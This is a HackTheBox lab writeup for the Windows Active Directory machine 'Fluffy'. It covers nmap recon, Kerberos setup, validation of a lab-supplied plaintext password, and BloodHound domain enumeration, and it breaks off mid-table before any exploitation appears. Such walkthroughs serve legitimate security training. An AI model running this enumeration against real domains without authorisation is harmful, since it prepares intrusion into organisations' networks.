---
render_with_liquid: false
title: HackTheBox Writeup - Fluffy
date: 2025-05-27 01:10:58 +1400
tags: [hackthebox, nmap, windows, ad, assumed-breach, netexec, bloodhound-ce, bloodhound-python, bloodhound-cli, ldeep, adcs, bloodyad, client-side-attack, coerce-authentication, cve-2025-24054, responder, smbclient, hashcat, dacl-abuse, shadow-credentials, certipy, pass-the-cert, pass-the-ticket, evil-winrm, adcs-esc16, impacket, dcsync]
image:
    path: https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/9ef7ca21-a028-4a8d-9419-723364595db8.png
    width: 640
    height: 480
---



`Fluffy` is an easy-difficulty Windows machine designed around an assumed breach scenario, where credentials for a low-privileged user are provided. By exploiting [CVE-2025-24071](https://nvd.nist.gov/vuln/detail/CVE-2025-24071), the credentials of another low-privileged user can be obtained. Further enumeration reveals the existence of ACLs over the `winrm_svc` and `ca_svc` accounts. `WinRM` can then be used to log in to the target using the `winrc_svc` account. Exploitation of an Active Directory Certificate service (`ESC16`) using the `ca_svc` account is required to obtain access to the `Administrator` account.

# Recon
---

## Hosts

> `pt` command is a **custom pentest framework** to manage hosts and variables, it is not required to reproduce the steps in this writeup
{: .prompt-info }

```bash
┌──(bravosec㉿fsociety)-[~/htb/Fluffy]
└─$ pt init '10.129.240.116 DC01.fluffy.htb DC01 fluffy.htb'
+---------+--------+----------------+-----------------+
| PROFILE | STATUS |       IP       |     DOMAIN      |
+---------+--------+----------------+-----------------+
| fluffy  | on     | 10.129.240.116 | DC01.fluffy.htb |
| fluffy  | on     | 10.129.240.116 | DC01            |
| fluffy  | on     | 10.129.240.116 | fluffy.htb      |
+---------+--------+----------------+-----------------+

╒═══════════╤════════════╤═════════════════╤════════════╤════════════════╤═══════╤══════════════╤═════════════════╕
│ profile   │ lhost      │ rhost           │ domain     │ ip             │ url   │ user         │ pass            │
╞═══════════╪════════════╪═════════════════╪════════════╪════════════════╪═══════╪══════════════╪═════════════════╡
│ fluffy    │ 10.10.14.7 │ DC01.fluffy.htb │ fluffy.htb │ 10.129.240.116 │       │ j.fleischman │ J0elTHEM4n1990! │
╘═══════════╧════════════╧═════════════════╧════════════╧════════════════╧═══════╧══════════════╧═════════════════╛
```


## Nmap

```bash
# Nmap 7.95 scan initiated Tue May 27 01:10:58 2025 as: /usr/lib/nmap/nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 53,88,139,389,445,464,593,636,3268,3269,5985,9389,49667,49685,49686,49690,49708,49723,49757, 10.129.240.172
Nmap scan report for 10.129.240.172
Host is up, received user-set (0.20s latency).
Scanned at 2025-05-27 01:10:58 CST for 126s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-05-27 08:35:52Z)
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-17T16:04:17
| Not valid after:  2026-04-17T16:04:17
| MD5:   2765:a68f:4883:dc6d:0969:5d0d:3666:c880
| SHA-1: 72f3:1d5f:e6f3:b8ab:6b0e:dd77:5414:0d0c:abfe:e681
| -----BEGIN CERTIFICATE-----
| MIIGJzCCBQ+gAwIBAgITUAAAAAJKRwEaLBjVaAAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGZmx1ZmZ5
| MRcwFQYDVQQDEw5mbHVmZnktREMwMS1DQTAeFw0yNTA0MTcxNjA0MTdaFw0yNjA0
| MTcxNjA0MTdaMBoxGDAWBgNVBAMTD0RDMDEuZmx1ZmZ5Lmh0YjCCASIwDQYJKoZI
| hvcNAQEBBQADggEPADCCAQoCggEBAOFkXHPh6Bv/Ejx+B3dfWbqtAmtOZY7gT6XO
| KD/ljfOwRrRuvKhf6b4Qam7mZ08lU7Z9etWUIGW27NNoK5qwMnXzw/sYDgGMNVn4
| bb/2kjQES+HFs0Hzd+s/BBcSSp1BnAgjbBDcW/SXelcyOeDmkDKTHS7gKR9zEvK3
| ozNNc9nFPj8GUYXYrEbImIrisUu83blL/1FERqAFbgGwKP5G/YtX8BgwO7iJIqoa
| 8bQHdMuugURvQptI+7YX7iwDFzMPo4sWfueINF49SZ9MwbOFVHHwSlclyvBiKGg8
| EmXJWD6q7H04xPcBdmDtbWQIGSsHiAj3EELcHbLh8cvk419RD5ECAwEAAaOCAzgw
| ggM0MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABs
| AGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQD
| AgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQME
| AgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglg
| hkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFMlh3+130Pna
| 0Hgb9AX2e8Uhyr0FMB8GA1UdIwQYMBaAFLZo6VUJI0gwnx+vL8f7rAgMKn0RMIHI
| BgNVHR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPWZsdWZmeS1EQzAxLUNB
| LENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERDPWh0Yj9jZXJ0aWZp
| Y2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0
| aW9uUG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6
| Ly8vQ049Zmx1ZmZ5LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNl
| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERD
| PWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlv
| bkF1dGhvcml0eTA7BgNVHREENDAyoB8GCSsGAQQBgjcZAaASBBB0co4Ym5z7RbSI
| 5tsj1jN/gg9EQzAxLmZsdWZmeS5odGIwTgYJKwYBBAGCNxkCBEEwP6A9BgorBgEE
| AYI3GQIBoC8ELVMtMS01LTIxLTQ5NzU1MDc2OC0yNzk3NzE2MjQ4LTI2MjcwNjQ1
| NzctMTAwMDANBgkqhkiG9w0BAQsFAAOCAQEAWjL2YkginWECPSm1EZyi8lPQisMm
| VNF2Ab2I8w/neK2EiXtN+3Z7W5xMZ20mC72lMaj8dLNN/xpJ9WIvQWrjXTO4NC2o
| 53OoRmAJdExwliBfAdKY0bc3GaKSLogT209lxqt+kO0fM2BpYnlP+N3R8mVEX2Fk
| 1WXCOK7M8oQrbaTPGtrDesMYrd7FQNTbZUCkunFRf85g/ZCAjshXrA3ERi32pEET
| eV9dUA0b1o+EkjChv+b1Eyt5unH3RDXpA9uvgpTJSFg1XZucmEbcdICBV6VshMJc
| 9r5Zuo/LdOGg/tqrZV8cNR/AusGMNslltUAYtK3HyjETE/REiQgwS9mBbQ==
|_-----END CERTIFICATE-----
|_ssl-date: 2025-05-27T08:37:49+00:00; +15h24m47s from scanner time.
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-17T16:04:17
| Not valid after:  2026-04-17T16:04:17
| MD5:   2765:a68f:4883:dc6d:0969:5d0d:3666:c880
| SHA-1: 72f3:1d5f:e6f3:b8ab:6b0e:dd77:5414:0d0c:abfe:e681
| -----BEGIN CERTIFICATE-----
| MIIGJzCCBQ+gAwIBAgITUAAAAAJKRwEaLBjVaAAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGZmx1ZmZ5
| MRcwFQYDVQQDEw5mbHVmZnktREMwMS1DQTAeFw0yNTA0MTcxNjA0MTdaFw0yNjA0
| MTcxNjA0MTdaMBoxGDAWBgNVBAMTD0RDMDEuZmx1ZmZ5Lmh0YjCCASIwDQYJKoZI
| hvcNAQEBBQADggEPADCCAQoCggEBAOFkXHPh6Bv/Ejx+B3dfWbqtAmtOZY7gT6XO
| KD/ljfOwRrRuvKhf6b4Qam7mZ08lU7Z9etWUIGW27NNoK5qwMnXzw/sYDgGMNVn4
| bb/2kjQES+HFs0Hzd+s/BBcSSp1BnAgjbBDcW/SXelcyOeDmkDKTHS7gKR9zEvK3
| ozNNc9nFPj8GUYXYrEbImIrisUu83blL/1FERqAFbgGwKP5G/YtX8BgwO7iJIqoa
| 8bQHdMuugURvQptI+7YX7iwDFzMPo4sWfueINF49SZ9MwbOFVHHwSlclyvBiKGg8
| EmXJWD6q7H04xPcBdmDtbWQIGSsHiAj3EELcHbLh8cvk419RD5ECAwEAAaOCAzgw
| ggM0MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABs
| AGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQD
| AgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQME
| AgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglg
| hkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFMlh3+130Pna
| 0Hgb9AX2e8Uhyr0FMB8GA1UdIwQYMBaAFLZo6VUJI0gwnx+vL8f7rAgMKn0RMIHI
| BgNVHR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPWZsdWZmeS1EQzAxLUNB
| LENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERDPWh0Yj9jZXJ0aWZp
| Y2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0
| aW9uUG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6
| Ly8vQ049Zmx1ZmZ5LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNl
| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERD
| PWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlv
| bkF1dGhvcml0eTA7BgNVHREENDAyoB8GCSsGAQQBgjcZAaASBBB0co4Ym5z7RbSI
| 5tsj1jN/gg9EQzAxLmZsdWZmeS5odGIwTgYJKwYBBAGCNxkCBEEwP6A9BgorBgEE
| AYI3GQIBoC8ELVMtMS01LTIxLTQ5NzU1MDc2OC0yNzk3NzE2MjQ4LTI2MjcwNjQ1
| NzctMTAwMDANBgkqhkiG9w0BAQsFAAOCAQEAWjL2YkginWECPSm1EZyi8lPQisMm
| VNF2Ab2I8w/neK2EiXtN+3Z7W5xMZ20mC72lMaj8dLNN/xpJ9WIvQWrjXTO4NC2o
| 53OoRmAJdExwliBfAdKY0bc3GaKSLogT209lxqt+kO0fM2BpYnlP+N3R8mVEX2Fk
| 1WXCOK7M8oQrbaTPGtrDesMYrd7FQNTbZUCkunFRf85g/ZCAjshXrA3ERi32pEET
| eV9dUA0b1o+EkjChv+b1Eyt5unH3RDXpA9uvgpTJSFg1XZucmEbcdICBV6VshMJc
| 9r5Zuo/LdOGg/tqrZV8cNR/AusGMNslltUAYtK3HyjETE/REiQgwS9mBbQ==
|_-----END CERTIFICATE-----
|_ssl-date: 2025-05-27T08:37:50+00:00; +15h24m47s from scanner time.
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-27T08:37:49+00:00; +15h24m47s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-17T16:04:17
| Not valid after:  2026-04-17T16:04:17
| MD5:   2765:a68f:4883:dc6d:0969:5d0d:3666:c880
| SHA-1: 72f3:1d5f:e6f3:b8ab:6b0e:dd77:5414:0d0c:abfe:e681
| -----BEGIN CERTIFICATE-----
| MIIGJzCCBQ+gAwIBAgITUAAAAAJKRwEaLBjVaAAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGZmx1ZmZ5
| MRcwFQYDVQQDEw5mbHVmZnktREMwMS1DQTAeFw0yNTA0MTcxNjA0MTdaFw0yNjA0
| MTcxNjA0MTdaMBoxGDAWBgNVBAMTD0RDMDEuZmx1ZmZ5Lmh0YjCCASIwDQYJKoZI
| hvcNAQEBBQADggEPADCCAQoCggEBAOFkXHPh6Bv/Ejx+B3dfWbqtAmtOZY7gT6XO
| KD/ljfOwRrRuvKhf6b4Qam7mZ08lU7Z9etWUIGW27NNoK5qwMnXzw/sYDgGMNVn4
| bb/2kjQES+HFs0Hzd+s/BBcSSp1BnAgjbBDcW/SXelcyOeDmkDKTHS7gKR9zEvK3
| ozNNc9nFPj8GUYXYrEbImIrisUu83blL/1FERqAFbgGwKP5G/YtX8BgwO7iJIqoa
| 8bQHdMuugURvQptI+7YX7iwDFzMPo4sWfueINF49SZ9MwbOFVHHwSlclyvBiKGg8
| EmXJWD6q7H04xPcBdmDtbWQIGSsHiAj3EELcHbLh8cvk419RD5ECAwEAAaOCAzgw
| ggM0MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABs
| AGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQD
| AgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQME
| AgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglg
| hkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFMlh3+130Pna
| 0Hgb9AX2e8Uhyr0FMB8GA1UdIwQYMBaAFLZo6VUJI0gwnx+vL8f7rAgMKn0RMIHI
| BgNVHR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPWZsdWZmeS1EQzAxLUNB
| LENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERDPWh0Yj9jZXJ0aWZp
| Y2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0
| aW9uUG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6
| Ly8vQ049Zmx1ZmZ5LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNl
| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERD
| PWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlv
| bkF1dGhvcml0eTA7BgNVHREENDAyoB8GCSsGAQQBgjcZAaASBBB0co4Ym5z7RbSI
| 5tsj1jN/gg9EQzAxLmZsdWZmeS5odGIwTgYJKwYBBAGCNxkCBEEwP6A9BgorBgEE
| AYI3GQIBoC8ELVMtMS01LTIxLTQ5NzU1MDc2OC0yNzk3NzE2MjQ4LTI2MjcwNjQ1
| NzctMTAwMDANBgkqhkiG9w0BAQsFAAOCAQEAWjL2YkginWECPSm1EZyi8lPQisMm
| VNF2Ab2I8w/neK2EiXtN+3Z7W5xMZ20mC72lMaj8dLNN/xpJ9WIvQWrjXTO4NC2o
| 53OoRmAJdExwliBfAdKY0bc3GaKSLogT209lxqt+kO0fM2BpYnlP+N3R8mVEX2Fk
| 1WXCOK7M8oQrbaTPGtrDesMYrd7FQNTbZUCkunFRf85g/ZCAjshXrA3ERi32pEET
| eV9dUA0b1o+EkjChv+b1Eyt5unH3RDXpA9uvgpTJSFg1XZucmEbcdICBV6VshMJc
| 9r5Zuo/LdOGg/tqrZV8cNR/AusGMNslltUAYtK3HyjETE/REiQgwS9mBbQ==
|_-----END CERTIFICATE-----
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-17T16:04:17
| Not valid after:  2026-04-17T16:04:17
| MD5:   2765:a68f:4883:dc6d:0969:5d0d:3666:c880
| SHA-1: 72f3:1d5f:e6f3:b8ab:6b0e:dd77:5414:0d0c:abfe:e681
| -----BEGIN CERTIFICATE-----
| MIIGJzCCBQ+gAwIBAgITUAAAAAJKRwEaLBjVaAAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGZmx1ZmZ5
| MRcwFQYDVQQDEw5mbHVmZnktREMwMS1DQTAeFw0yNTA0MTcxNjA0MTdaFw0yNjA0
| MTcxNjA0MTdaMBoxGDAWBgNVBAMTD0RDMDEuZmx1ZmZ5Lmh0YjCCASIwDQYJKoZI
| hvcNAQEBBQADggEPADCCAQoCggEBAOFkXHPh6Bv/Ejx+B3dfWbqtAmtOZY7gT6XO
| KD/ljfOwRrRuvKhf6b4Qam7mZ08lU7Z9etWUIGW27NNoK5qwMnXzw/sYDgGMNVn4
| bb/2kjQES+HFs0Hzd+s/BBcSSp1BnAgjbBDcW/SXelcyOeDmkDKTHS7gKR9zEvK3
| ozNNc9nFPj8GUYXYrEbImIrisUu83blL/1FERqAFbgGwKP5G/YtX8BgwO7iJIqoa
| 8bQHdMuugURvQptI+7YX7iwDFzMPo4sWfueINF49SZ9MwbOFVHHwSlclyvBiKGg8
| EmXJWD6q7H04xPcBdmDtbWQIGSsHiAj3EELcHbLh8cvk419RD5ECAwEAAaOCAzgw
| ggM0MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABs
| AGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQD
| AgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQME
| AgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglg
| hkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFMlh3+130Pna
| 0Hgb9AX2e8Uhyr0FMB8GA1UdIwQYMBaAFLZo6VUJI0gwnx+vL8f7rAgMKn0RMIHI
| BgNVHR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPWZsdWZmeS1EQzAxLUNB
| LENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERDPWh0Yj9jZXJ0aWZp
| Y2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0
| aW9uUG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6
| Ly8vQ049Zmx1ZmZ5LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNl
| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERD
| PWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlv
| bkF1dGhvcml0eTA7BgNVHREENDAyoB8GCSsGAQQBgjcZAaASBBB0co4Ym5z7RbSI
| 5tsj1jN/gg9EQzAxLmZsdWZmeS5odGIwTgYJKwYBBAGCNxkCBEEwP6A9BgorBgEE
| AYI3GQIBoC8ELVMtMS01LTIxLTQ5NzU1MDc2OC0yNzk3NzE2MjQ4LTI2MjcwNjQ1
| NzctMTAwMDANBgkqhkiG9w0BAQsFAAOCAQEAWjL2YkginWECPSm1EZyi8lPQisMm
| VNF2Ab2I8w/neK2EiXtN+3Z7W5xMZ20mC72lMaj8dLNN/xpJ9WIvQWrjXTO4NC2o
| 53OoRmAJdExwliBfAdKY0bc3GaKSLogT209lxqt+kO0fM2BpYnlP+N3R8mVEX2Fk
| 1WXCOK7M8oQrbaTPGtrDesMYrd7FQNTbZUCkunFRf85g/ZCAjshXrA3ERi32pEET
| eV9dUA0b1o+EkjChv+b1Eyt5unH3RDXpA9uvgpTJSFg1XZucmEbcdICBV6VshMJc
| 9r5Zuo/LdOGg/tqrZV8cNR/AusGMNslltUAYtK3HyjETE/REiQgwS9mBbQ==
|_-----END CERTIFICATE-----
|_ssl-date: 2025-05-27T08:37:50+00:00; +15h24m47s from scanner time.
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49685/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49686/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49690/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49708/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49723/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49757/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-05-27T08:37:13
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 16363/tcp): CLEAN (Timeout)
|   Check 2 (port 13430/tcp): CLEAN (Timeout)
|   Check 3 (port 63800/udp): CLEAN (Timeout)
|   Check 4 (port 38455/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 15h24m46s, deviation: 0s, median: 15h24m46s

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue May 27 01:13:04 2025 -- 1 IP address (1 host up) scanned in 125.89 seconds
```


# User Flag
---

## Auth as j.fleischman


### Assumed breach scenario

![](/assets/obsidian/d142d7f311479a68bcb9af14a299cbce.png)


### Setup environment for AD

Retrieve the DC's machine name and domain name

```bash
┌──(bravosec㉿fsociety)-[~/htb/Fluffy]
└─$ nxc smb 10.129.240.116
SMB         10.129.240.116  445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
```

Add to hosts

```bash
┌──(bravosec㉿fsociety)-[~/htb/Fluffy]
└─$ tail -n 5 /etc/hosts
# profile.on fluffy
10.129.240.116 DC01.fluffy.htb
10.129.240.116 DC01
10.129.240.116 fluffy.htb
# end
```

Sync time with DC

```bash
┌──(bravosec㉿fsociety)-[~/htb/Fluffy]
└─$ sudo ~/scripts/ad/sync_ntp.sh $(pt get ip)
[*] Disable virtualbox's auto time sync
-> sudo /etc/init.d/virtualbox-guest-utils stop
Stopping virtualbox-guest-utils (via systemctl): virtualbox-guest-utils.service.

[*] Stop systemd-timesyncd to sync Time manually
-> sudo systemctl stop systemd-timesyncd

[*] Disable system time sync
-> sudo systemctl disable --now chronyd
Failed to disable unit: Unit chronyd.service does not exist

[*] Sync time with NTP server
-> sudo ntpdate -u $1
2025-05-28 02:02:14.512308 (+0800) +55487.774841 +/- 0.106972 10.129.240.116 s1 no-leap
CLOCK: time stepped by 55487.774841

Done syncing time with NTP server: 10.129.240.116
```

Configure **kerberos**

```bash
┌──(bravosec㉿fsociety)-[~/htb/Fluffy]
└─$ pt set dc_name "$(cat .pt/hosts | head -n1 | awk '{print $3}')"; pt set dc_fqdn "$(pt get dc_name).$(pt get domain)"

┌──(bravosec㉿fsociety)-[~/htb/Fluffy]
└─$ sudo ~/scripts/ad/configure_krb5.py $(pt get domain) $(pt get dc_name)
[*] Configuration Data:
[libdefault]
        default_realm = FLUFFY.HTB

[realms]
        FLUFFY.HTB = {
                kdc = dc01.fluffy.htb
                admin_server = dc01.fluffy.htb
        }

[domain_realm]
        fluffy.htb = FLUFFY.HTB
        .fluffy.htb = FLUFFY.HTB

[*] Previous config backed up to /etc/krb5.conf~
[+] /etc/krb5.conf has been configured
```

Validate authentication

```bash
┌──(bravosec㉿fsociety)-[~/htb/Fluffy]
└─$ nxc smb $(pt get rhost) -k -u 'j.fleischman' -p 'J0elTHEM4n1990!'
SMB         DC01.fluffy.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         DC01.fluffy.htb 445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990!
```

Add the credential to record

```bash
┌──(bravosec㉿fsociety)-[~/htb/Fluffy]
└─$ echo -n "Username: "; read user; echo -n "Password: "; stty -echo; read pass; stty echo; echo; pt set user "$user"; pt set pass "$pass"; echo "${user}:${pass}" | anew -q creds.lst
Username: j.fleischman
Password:
```


## Auth as p.agila


### Domain enumeration


#### Bloodhound

Run collectors

```bash
┌──(bravosec㉿fsociety)-[~/htb/Fluffy]
└─$ bloodhound-ce-python -d "$(pt get domain)" -ns $(pt get ip) -c all --zip -u "$(pt get user)" -p "$(pt get pass)"
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: fluffy.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.fluffy.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.fluffy.htb
INFO: Found 10 users
INFO: Found 54 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.fluffy.htb
INFO: Done in 00M 35S
INFO: Compressing output into 20250528021738_bloodhound.zip
```

Start bloodhound

```bash
sudo docker-compose -f /opt/sectools/ad/bloodhound-ce/docker-compose.yml up
```


#### bhcli

Upload the latest collected data

```bash
┌──(bravosec㉿fsociety)-[~/htb/Fluffy]
└─$ bhcli upload `ls -t *_bloodhound.zip | head -1`
INFO: Starting new file upload job...
INFO: Uploading file 20250528021738_bloodhound.zip
INFO: Ending file upload job...
INFO: Now waiting for ingestion being complete...
INFO: Ingestion completed, the data is now available.
```

Quick checks

```bash
┌──(bravosec㉿fsociety)-[~/htb/Fluffy]
└─$ bhcli stats -d "$(pt get domain)"
┌────────────────────┬─────────┬─────────┐
│ FLUFFY.HTB         │   all   │ enabled │
├────────────────────┼─────────┼─────────┤
│ User Accounts      │      10 │       8 │
│ Computer Accounts  │       1 │       1 │
│ Domain Admins      │       1 │       1 │
│ Domain Controllers │       1 │       1 │
│ Protected Users    │       0 │       0 │
│ Groups             │      53 │         │
